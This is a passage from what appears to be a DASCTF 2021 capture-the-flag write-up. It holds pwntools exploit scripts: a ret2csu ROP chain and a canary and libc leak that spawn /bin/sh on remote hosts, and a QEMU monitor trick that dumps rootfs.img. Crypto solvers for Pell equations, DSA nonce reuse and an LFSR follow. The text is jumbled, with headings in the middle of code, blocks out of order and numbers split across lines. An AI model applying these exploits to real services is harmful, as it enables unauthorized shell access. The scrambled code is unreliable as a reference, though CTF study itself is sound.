s = remote("82.157.6.165","22000")
payload = b'A'*0x50+p64(0)+csu(read_got,0,alarm_got,1)
payload += csu(read_got,0,elf.bss(0x500),0x100)
payload += csu(alarm_got,elf.bss(0x500),0,0)
string_go
修改string结构体size进⾏泄漏
# gdb.attach(s,"b *0x4007a9\nc")
sleep(3)
s.send(payload)
sleep(0.5)
s.send(b'\x38')
sleep(0.5)
s.send(b'/bin/sh\x00'.ljust(59,b'\x00'))
s.sendline(b'ls')
tmp = s.recv(timeout=1)
print('ls:'+tmp)
if(tmp != None):
    s.sendline("ls")
    s.interactive()
    # except:
    #     pass
from pwn import *
# s = process("./string_go")
s = remote("82.157.20.104","42500")
context.terminal = ['ancyterm', '-s', 'host.docker.internal', '-p', '15111', '-t', 
'iterm2', '-e']
libc = ELF("./libc-2.27.so")
s.sendlineafter(">>","2+1")
s.sendlineafter(">>","-8")
# gdb.attach(s,"b *$rebase(0x23a4)\nc")
s.sendlineafter(">>","a"*8)
s.sendlineafter(">>","\xff")
s.recvuntil("a"*8)
s.recv(0x30)
canary = u64(s.recv(8))
success(hex(canary))
s.recv(0xb8)
libc.address = u64(s.recv(8))&0xffffffffffff
libc.address -= 0x21bf7
success(hex(libc.address))
pop_rdi = 0x00000000000215bf+libc.address
sh = next(libc.search("/bin/sh"))
system = libc.sym['system']
easykernel
没有重定向monitor,直接读rootfs.img
payload = 
'A'*0x18+p64(canary)+p64(0x10)+p64(0x8)*2+p64(pop_rdi)+p64(sh)+p64(pop_rdi+1)+p64(syste
m)
s.sendlineafter(">>",payload)
s.interactive()
from pwn import *
from tqdm import trange
import fuckpy3
context(os='linux', arch='amd64', log_level='error')
DEBUG = 0
if DEBUG:
    p = process(argv='./start.sh', raw=False)
else:
    p = remote('82.157.40.132', 35600)
def main():
    ctrl_a = '\x01c'
    p.send(ctrl_a)
    s = b''
    p.sendlineafter('(qemu)', 'stop')
    # p.sendlineafter('(qemu)', 'xp/100000bc 0x000000')
    p.sendlineafter('(qemu)', 'drive_add 0 
file=/rootfs.img,id=flag,format=raw,if=none,readonly=on')
    for i in trange(160):
        p.sendlineafter('(qemu)', f'qemu-io flag "read -v {0x4000*i} 0x4000"')
        p.recvuntil('\r\n')
        data = p.recvuntil('ops/sec)\n', drop=True).split(b'\n')[:-2]
        for d in data:
            s += b''.join(d.split()[1:17]).unhex()
    i = 160
    p.sendlineafter('(qemu)', f'qemu-io flag "read -v {0x4000*i} 0x600"')
    p.recvuntil('\r\n')
    data = p.recvuntil('ops/sec)\n', drop=True).split(b'\n')[:-2]
    for d in data:
        s += b''.join(d.split()[1:17]).unhex()
    # print(s)
    with open('out.img','wb') as f:
        f.write(s)
    # print(data)
    p.interactive()
Misc
签到
暗号对上，DASCTF{welc0m3_t0_9C51s_2021} ~
温馨提醒，本次⽐赛 flag 格式⼀般为 DASCTF{}/flag{}，在界⾯上提交时只需要提交括号内的内容，⽐如这个题你
就只需要提交 welc0m3_t0_9C51s_2021 作为 flag 即可！
Crypto
unknown_dsa
if __name__ == '__main__':
    main()
from Crypto.Util.number import *
from Crypto.Hash import SHA
wl = [3912956711, 4013184893, 3260747771]
cl1 = 
[28525892237799287962665406004216787908890672849116825789242161860525903935956453221615
633866155124752567263843650917110344496827912689946237589377528747509182009618889970824
771008110257218987207836668686234982462196772211062276608955190586319650557907091302077
60704, 
211158499061801396563106646074584256376705200819832482589841660262228987535050089041366
888200757204110041582641386597621018735885836864733889517447339367697326172796497970851
52057880233721961, 
301899179092185964785847705166950181255677272294377823045011205035318463496682788289651
177635341894308537787449148199583490117059526971759804426977947952721266880757177055335
088777693134693713345640206540670123872210178680306100865355059146219281124303460105424
]
cl2 = 
[14805245002940976705662351036536660222877843156928840757713198043507452963271501497113
345262602122694463228247931237866735379211713345206997233416938683722728592401118703567
187475890102871950516388778938283577066421804574346522278885925827282621786987760731414
4, 
164363185031805515194693838138967103973882495327281640237109511804717975884670307093185
023866826262544482656483345229480711054444153783019975205004069744094814609272371366112
5309994275256, 
109495870160167959404459761984601492581446353669964555986052447435407287646359470610377
799126612073228201805411141796129160183176004038160277033911109221123119109000344423403
87304006761589708943814396303183085858356961537279163175384848010568152485779372842]
from sage.all import *
# https://mathsci.kaist.ac.kr/cms/wp-content/uploads/2017/11/NumberTheory_Sage.pdf
def solve_pell(N, c1, c2):
    cf = continued_fraction(sqrt(N))
    for i in range(10000):
        denom = cf.denominator(i)
        numer = cf.numerator(i)
        if numer*numer - N * denom*denom == 1 and c1.bit_length() <= numer.nbits() <= 
c1.bit_length()+2 and c2.bit_length() <= denom.nbits() <= c2.bit_length()+2:
            return numer, denom
    return None, None
us = []
vs = []
for i in range(3):
    u,v = solve_pell(wl[i],cl1[i],cl2[i])
    us.append(u)
    vs.append(v)
m1 = long_to_bytes(crt(cl1,us).nth_root(7))
m2 = long_to_bytes(crt(cl2,vs).nth_root(7))
print(m1,m2)
p = 
951393538807721049398706181454482342510311051534065658330297872990403783950021904383815
379748537778906929244071678238189800826728735381331271313568101530129240252708839661724
206587779033375760271059541198114954111490929604220554451210972598026869602882583997541
85484307350305454788837702363971523085335074839
n = 
851986153860756075670700209699817778276718736546312004720782419807378344388979001462488
402791911391564165371083996828743706298882073345062370400178383135589112750739041484515
402557058184775811828662694130182630798586802216473416807629890804180399727047590033436
166524754381558068587359823529307712448809901903185269332674552489137822979916850411875
65140859
q = n//p
assert p*q==n
t = 
601321763959228969025188452440510654171435075505198602110779655017833159711094335444824
112082384851355540652418649563616768782203425002080110893837512254374170498937255461767
994171888759726772936800330053998831135311937053534048921418114934150797554561858588898
014563869108922398697328052738792810946133296453262872057366145463111436355800514444465
76104548
g = pow(t, inverse(p*q-(p+q), (p-1)*(q-1)),p*q)
assert t==pow(g, p*q-(p+q), p*q)
hm1 = bytes_to_long(SHA.new(m1).digest())
hm2 = bytes_to_long(SHA.new(m2).digest())
r1, s1, s2 = 498841194617327650445431051685964174399227739376, 
376599166921876118994132185660203151983500670896, 
187705159843973102963593151204361139335048329243
FilterRandom
r2, s3 = 620827881415493136309071302986914844220776856282, 
674735360250004315267988424435741132047607535029
k = inverse((s1-s2)*inverse(hm1-hm2,q),q)%q
print(long_to_bytes((s1*k%q-hm1)*inverse(r1,q)%q))
print(long_to_bytes((s3*k%q-hm1)*inverse(r2,q)%q))
class lfsr():
    def __init__(self, init, mask, length):
        self.init = init
        self.mask = mask
        self.lengthmask = 2**length-1
    def next(self):
        nextdata = (self.init << 1) & self.lengthmask 